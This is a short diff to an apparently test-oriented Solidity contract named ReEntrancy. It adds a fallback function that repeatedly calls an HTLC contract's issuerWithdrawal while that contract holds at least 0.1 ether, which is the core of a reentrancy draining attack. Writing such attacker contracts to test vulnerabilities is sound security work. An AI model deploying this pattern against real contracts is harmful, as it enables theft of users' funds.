@@ -17,6 +17,11 @@ contract ReEntrancy {
 
     fallback() external payable {
         
+        if (address(htlcEth).balance >= 0.1 ether) {
+
+            htlcEth.issuerWithdrawal(id, secret);
+
+        }
     }
 
     
